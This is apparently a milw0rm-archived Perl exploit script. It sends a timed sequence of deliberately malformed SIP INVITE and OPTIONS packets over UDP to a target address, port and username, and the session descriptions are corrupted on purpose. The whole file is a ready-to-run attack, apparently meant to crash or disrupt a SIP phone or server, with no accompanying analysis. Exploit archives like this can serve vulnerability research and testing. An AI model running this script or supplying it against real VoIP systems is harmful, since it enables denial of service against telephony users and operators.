#!/usr/bin/perl

use IO::Socket::INET;

die "Usage $0 <dst-address> <dst-port> <dst_username> <src-address>" unless ($ARGV[3]);

 

$socket=new IO::Socket::INET->new(PeerPort=>$ARGV[1],

        Proto=>'udp',

        PeerAddr=>$ARGV[0]);

 

 

$msg = "INVITE sip:$ARGV[2]\@$ARGV[0] SIP/2.0\r\nVia: SIP/2.0/UDP $ARGV[3];branch=01;rport\r\nFrom: <sip:tucu\@$ARGV[3]>;tag=01\r\nTo: <sip:$ARGV[2]\@invalidURL>\r\nCall-ID: 01\@$ARGV[3]\r\nCSeq: 7532 INVITE\r\nMax-Forwards: 70\r\nAllow: INVITE, ACK, CANCEL, OPTIONS, BYL, REFER, SUBSCRIBE, NOTIFY\r\nContent-Type: application/sdp\r\nContent-Length: 215\r\n\r\nv=0\r\no=r`ot 7213 7244 IN IP4 192.168.1.101\r\ns=session\r\nc=IN IP4 192.168.1.101\r\nt=0 0\r\nm=aIdio 8000 RTP/AVP 0 101\r\na=rtpmau:0 PCMU/8000\r\na=rtpmap:101 telephone-event/80 0\r\na=fmtp:101 0-16\r\na=silenceSupp:off - - - -\r\n";

$socket->send($msg);

 

sleep(8.2);

$msg = "OPTIONS sip:$ARGV[2]\@$ARGV[0] SIP/2.0\r\nVia: SIP/2.0/UDP $ARGV[3];rport;branch=02\r\nMax-Forwards: 70\r\nTo: <sip:$ARGV[2]\@$ARGV[0]>\r\nFrom: <sip:tucu\@$ARGV[3]>;tag=02\r\nCall-ID: 02\@$ARGV[3]\r\nCSeq: 79 OPTIONS\r\nAccept: application/sdp\r\nContent-Length: 0\r\n\r\n";

$socket->send($msg);

 

sleep(1.5);

$msg = "OPTIONS sip:$ARGV[2]\@$ARGV[0] SIP/2.0\r\nVia: SIP/2.0/UDP $ARGV[3];rport;branch=02\r\nMax-Forwards: 70\r\nTo: <sip:$ARGV[2]\@$ARGV[0]>\r\nFrom: <sip:tucu\@$ARGV[3]>;tag=03\r\nCall-ID: 01\@$ARGV[3]\r\nCSeq: 15853 OPTIONS\r\nAccept: application/sdp\r\nContent-Length: 0\r\n\r\n";

$socket->send($msg);

 

sleep(3.3);

$msg = "INVITE sip:$ARGV[2]\@$ARGV[0] SIP/2.0\r\nVia: SIP/2.0/UDP $ARGV[3];rport;branch=02\r\nMax-Forwards: 70\r\nTo: <sip:$ARGV[2]\@$ARGV[0]>\r\nFrom: <sip:tucu\@$ARGV[3]>;tag=04\r\nCall-ID: 04\@$ARGV[3]\r\nCSeq: 36688 INVITE\r\nContent-Type: application/sdp\r\nAllow: INVITE, ACK, BTE, CANCEL, OPTIONS, PRACK, REFEY, NOTIFY, SUBSCRIBE, INFO\r\nSupported: 100rel\r\nUser-Agent: Twinkle/0.9\r\nContent-Length: 314\r\n\r\nv=0\r\no=0231555775 2006994253 1729335607 IN IP4 192.168.1.101\r\ns=-\r\nc=IN IP4 192.168.1.101\r\nt=0 0\r\nm=audio 8002 RTP/AVP 98 97 8 0 3 101\r\na=rtpmap:98 speex/16000\r\na=rtpmap:97  peex/80-0\r\na=rtpmap:8 PCMA/8000\r\na=rtpmap:0 PCMU/8000\r\na=rtpma\x00:3 GSM/8000\r\na=rtpmap:101 telephone-event/8000\r\na=fmtp:101 0-15\r\na=ptime:20\r\n";

$socket->send($msg);

 

sleep(4);

$msg = "OPTIONS sip:$ARGV[2]\@invalidURL SIP/2.0\r\nVia: SIP/2.0/UDP $ARGV[3];rport;branch=02\r\nMax-Forwards: 70\r\nTo: <sip:$ARGV[2]\@invalidURL>\r\nFrom: <sip:tucu\@$ARGV[3]>;tag=01\r\nCall-ID: 01\@$ARGV[3]\r\nCSeq: 21013 OPTIONS\r\nAccept: application/sdp\r\nContent-Length: 0\r\n\r\n";

$socket->send($msg);

 

sleep(4);

$msg = "OPTIONS sip:$ARGV[2]\@invalidURL SIP/2.0\r\nVia: SIP/2.0/UDP $ARGV[3];rport;branch=02\r\nMax-Forwards: 70\r\nTo: <sip:$ARGV[2]\@invalidURL>\r\nFrom: <sip:tucu\@$ARGV[3]>;tag=01\r\nCall-ID: 01\@$ARGV[3]\r\nCSeq: 18031 OPTIONS\r\nAccept: application/sdp\r\nContent-Length: 0\r\n\r\n";

$socket->send($msg);

 

sleep(12);

$msg = "OPTIONS sip:$ARGV[2]\@$ARGV[0] SIP/2.0\r\nVia: SIP/2.0/UDP $ARGV[3];rport;branch=02\r\nMax-Forwards: 70\r\nTo: <sip:$ARGV[2]\@$ARGV[0]>\r\nFrom:  <sip:tucu\@$ARGV[3]>;tag=07\r\nCall-ID: 07\@$ARGV[3]\r\nCSeq: 41664 OPTIONS\r\nAccept: application/sdp\r\nContent-Length: 0\r\n\r\n";

$socket->send($msg);

 

sleep(3);

$msg = "INVITE sip:invaliduser\@$ARGV[0] SIP/2.0\r\nVia: SIP/2.0/UDP $ARGV[3];branch=02;rport\r\nFrom: <sip:tucu\@$ARGV[3]>;tag=08\r\nTo: <sip:7440-2\@$ARGV[0]>\r\nContact: <sip:tucu\@$ARGV[3]>\r\nCall-ID: 08\@$ARGV[3]\r\nCSeq: 35502 INVITE\r\nMax-Forwards: 70\r\nAllow: INVITE, ACK, CANCEL, OPTIONS, BYE, REFER, SUBSCRIBE, NOTIFY\r\nContent-Type: application/sdp\r\nContent-Length: 286\r\n\r\nv=0\r\no=root 7213 7217 IN IP4 192.168.1.4\r\ns=session\r\nc=IN IP4 192.168.1.4\r\nt=0 0\r\nm=audio 19024 RTP/AVP 0 3 8 97 101\r\na=rtpmap:0 PCMU/8000\r\na=rtpmap:3/GSM/8000\r\na=rtpmIp:8 PCMA/8000\r\na=rtpmap:97 spee8/8000\r\na=rtpmap:101 telephone-event/8000\r\na=fmtp:101 0-16\r\na=silenceSupp:off - - - -\r\n";

$socket->send($msg);

 

sleep(3);

$msg = "OPTIONS sip:$ARGV[2]\@$ARGV[0] SIP/2.0\r\nVia: SIP/2.0/UDP $ARGV[3];rport;branch=02\r\nMax-Forwards: 70\r\nTo: <sip:$ARGV[2]\@$ARGV[0]>\r\nFrom: <sip:tucu\@$ARGV[3]>;tag=09\r\nCall-ID: 09\@$ARGV[3]\r\nCSeq: 18883 OPTIONS\r\nAccept: application/sdp\r\nUser-Agent: Twinkle/0.9\r\nContent-Length: 0\r\n\r\n";

$socket->send($msg);

 

sleep(3);

$msg = "OPTIONS sip:$ARGV[2]\@$ARGV[0] SIP/2.0\r\nVia: SIP/2.0/UDP $ARGV[3];rport;branch=02\r\nMax-Forwards: 70\r\nTo: <sip:$ARGV[2]\@$ARGV[0]>\r\nFrom: <sip:tucu\@$ARGV[3]>;tag=10\r\nCall-ID: 10\@$ARGV[3]\r\nCSeq: 6298 OPTIONS\r\nAccept: application/sdp\r\nContent-Length: 0\r\n\r\n";

$socket->send($msg);

# milw0rm.com [2007-08-21]
